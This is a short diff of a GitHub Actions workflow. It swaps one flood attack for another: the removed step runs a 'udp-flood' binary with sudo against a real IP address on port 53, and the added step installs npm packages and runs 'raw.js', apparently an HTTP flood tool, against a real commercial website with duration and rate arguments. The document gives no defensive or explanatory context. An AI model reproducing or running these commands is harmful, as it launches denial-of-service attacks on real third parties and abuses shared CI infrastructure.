@@ -11,4 +11,4 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x udp-flood
-      - run: echo y | sudo ./udp-flood 147.75.71.117 53 0 0 0
+      - run: npm i chalk@2.3 && npm i hpack && npm i socks && node raw.js GET https://www.airbridge.io/ 1200 5 90 --debug --full
